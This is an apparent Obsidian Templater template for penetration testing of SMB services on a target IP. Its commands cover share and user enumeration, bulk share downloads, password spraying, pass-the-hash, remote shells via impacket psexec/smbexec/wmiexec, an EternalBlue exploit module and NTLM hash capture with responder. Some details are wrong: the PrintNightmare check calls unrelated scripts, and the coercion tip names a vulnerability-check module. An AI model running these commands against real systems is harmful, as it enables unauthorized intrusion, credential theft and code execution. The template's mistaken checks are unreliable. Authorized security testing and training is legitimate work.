<%-*
if (tp.frontmatter.current_port == undefined) {
  tp.frontmatter.current_port = await tp.system.prompt('Enter SMB port number: ')
}
-%>
# SMB — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let ip = tp.frontmatter.target_ip
let domain = tp.frontmatter.domain
let user = tp.frontmatter.username || '<user>'
let pass = tp.frontmatter.password || '<pass>'
let different_port = port !== 445 ? `--port=${port}` : ""
let smbMap_port = port !== 445 ? `-P ${port}` : ""
let nxc_port = port !== 445 ? `--port ${port}` : ""
-%>

---

## Nmap
```bash
nmap -p<% port %> --script="smb-vuln-*" <% ip %>
```

```bash
nmap -p<% port %> --script=smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups,smb-os-discovery,smb-security-mode <% ip %>
```

```bash
nmap -p<% port %> --script=smb2-security-mode,smb2-capabilities <% ip %>
```

---

## Null / Anonymous Session Enumeration

### SMBClient
```bash
smbclient -N -L //<% ip %> <% different_port %>
```

```bash
smbclient -N -L //<% ip %> <% different_port %> 2>/dev/null
```

### SMBMap
```bash
smbmap -H <% ip %> <% smbMap_port %>
```

```bash
smbmap -H <% ip %> <% smbMap_port %> -d <% domain %>
```

### NetExec (CrackMapExec)
```bash
nxc smb <% ip %> <% nxc_port %>
```

```bash
nxc smb <% ip %> <% nxc_port %> --shares -u '' -p ''
```

### Enum4linux-ng
```bash
enum4linux-ng -A <% ip %> | tee enum4linux_<% ip %>.txt
```

```bash
enum4linux -a <% ip %>
```

---

## Authenticated Enumeration
```bash
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' --shares
```

```bash
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' --users
```

```bash
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' --groups
```

```bash
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' --sessions
```

```bash
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' --rid-brute
```

```bash
smbmap -H <% ip %> <% smbMap_port %> -u '<% user %>' -p '<% pass %>'
```

```bash
smbmap -H <% ip %> <% smbMap_port %> -u '<% user %>' -p '<% pass %>' -R
```

---

## Connect to Share
```bash
smbclient //<% ip %>/<share> -U '<% user %>' <% different_port %>
```

```bash
# NT hash auth
smbclient //<% ip %>/<share> -U '<% user %>%<ntlmhash>' --pw-nt-hash <% different_port %>
```

---

## Download Everything from Share
```bash
smbclient //<% ip %>/<share> -U '<% user %>' -c 'prompt OFF; recurse ON; mget *' <% different_port %>
```

```bash
# Mount share
sudo mount -t cifs //<% ip %>/<share> /mnt/smb -o username='<% user %>',password='<% pass %>',domain='<% domain %>'
```

```bash
# SMBMap recursive download
smbmap -H <% ip %> <% smbMap_port %> -u '<% user %>' -p '<% pass %>' -R <share> -A '.*' -q
```

---

## Credential Attacks

### Password Spray (careful — lockouts!)
```bash
nxc smb <% ip %> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

```bash
nxc smb <% ip %> -u users.txt -p 'Password123!' --continue-on-success
```

### Pass the Hash
```bash
nxc smb <% ip %> -u '<% user %>' -H '<% tp.frontmatter.ntlm_hash || 'NTLM_HASH' %>' --shares
```

```bash
impacket-smbexec <% domain %>/<% user %>@<% ip %> -hashes :<% tp.frontmatter.ntlm_hash || 'NTHASH' %>
```

---

## Remote Code Execution
```bash
# PSExec
impacket-psexec <% domain %>/<% user %>:'<% pass %>'@<% ip %>
```

```bash
# SMBExec (no binary upload)
impacket-smbexec <% domain %>/<% user %>:'<% pass %>'@<% ip %>
```

```bash
# WMIExec (no service creation)
impacket-wmiexec <% domain %>/<% user %>:'<% pass %>'@<% ip %>
```

```bash
# NetExec execute command
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' -x 'whoami'
nxc smb <% ip %> -u '<% user %>' -p '<% pass %>' -X 'whoami'
```

---

## Vulnerability Checks

### EternalBlue (MS17-010)
```bash
nmap -p<% port %> --script=smb-vuln-ms17-010 <% ip %>
```

```bash
# msf: use exploit/windows/smb/ms17_010_eternalblue
```

### MS08-067
```bash
nmap -p<% port %> --script=smb-vuln-ms08-067 <% ip %>
```

### PrintNightmare (CVE-2021-34527)
```bash
nmap -p<% port %> --script=smb-vuln-ms10-054,smb-vuln-ms10-061 <% ip %>
```

### BlueKeep — check RDP instead (3389)
### SMBGhost (CVE-2020-0796)
```bash
nmap -p<% port %> --script smb-vuln-smbghost <% ip %>
```

---

## NTLM Hash Capture (via SMB)
```bash
# Start responder in SMB capture mode
sudo responder -I tun0 -wd

# Or impacket SMB server
sudo impacket-smbserver share ./ -smb2support
```

> [!tip] Then coerce a connection from target: `nxc smb <% ip %> -u <user> -p <pass> -M smbghost`

---

## SMB Signing
```bash
nxc smb <% ip %> --gen-relay-list unsigned_hosts.txt
nmap -p<% port %> --script=smb2-security-mode <% ip %>
```

> [!warning] If signing is **not required**, SMB relay attacks are possible — see NTLM relay playbook.

---

## Notes
